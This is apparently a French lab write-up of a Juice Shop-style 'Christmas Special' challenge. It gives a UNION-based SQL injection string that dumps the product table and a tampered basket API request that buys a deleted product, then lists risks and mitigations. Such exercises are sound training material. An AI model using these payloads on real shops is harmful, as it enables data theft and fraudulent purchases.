## methodology:
# – steps :
1. ayant compléter les challenge précédant j'ai pu injecter une requête : "banana'))UNION%20ALL%20SELECT%20*%20from%20products--" afin
d'obtenir l'id la description etc etc de chaque produit de la boutique
2. Recherche du Christmas Special trouvé avec ces infos :
# -----------------------
"id":10,
"name":"Christmas Super-Surprise-Box (2014 Edition)",
"description":"Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price! (Seasonal special offer! Limited availability!)",
"price":29.99,"deluxePrice":29.99,"image":"undefined.jpg",
"createdAt":"2025-12-15 11:51:12.802 +00:00",
"updatedAt":"2025-12-15 11:51:12.802 +00:00",
"deletedAt":"2025-12-15 11:51:12.898 +00:00"
# -----------------------

3. direction vers un compte pour pouvoir ajouter au panier certains produit le panier et récupération depuis l'http history la requete api/BasketItems.
4. je me focus sur cette parti du post : {"ProductId":6,"BasketId":"2","quantity":1} pour le changer en :
{
    "ProductId":10",
    BasketId":"2",
    "quantity":1,
    "updatedAt":"2025-12-15 11:51:12.802 +00:00",
    "deletedAt":"2025-12-15 11:51:12.898 +00:00"
    }
5. acheter et profitez du cadeaux de noêl !

- SQL injection
# – tool used  :
- burp suit
## vulnerabilities:
# – vulnerability name :
- SQL injection
# – affected components :
- base de données
# – severity level :
- haut
## risks:
# – business impact :
- fuite de données
## actions:
# – propose risks mitigation strategies :
- utiliser systématiquement des prepared statements pour empêcher toute injection sql dans les barres de recherche ou filtres.
#  remediation fixes :
- implémenter un filtre global sur les caractères spéciaux sq